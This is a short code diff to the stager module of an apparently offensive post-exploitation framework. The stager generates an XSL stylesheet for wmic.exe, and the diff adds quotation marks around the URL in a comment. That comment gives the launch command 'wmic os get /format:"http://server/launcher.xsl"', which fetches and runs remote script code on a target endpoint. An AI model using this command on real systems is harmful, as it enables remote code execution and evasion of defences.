@@ -12,7 +12,7 @@ class Stager:
             'Description': ('Generates an XSL stylesheets file to be run with wmic.exe'),
 
             'Comments': [
-                'On the endpoint simply launch wmic os get /format:http://server/launcher.xsl'
+                'On the endpoint simply launch wmic os get /format:"http://server/launcher.xsl"'
             ]
         }
 
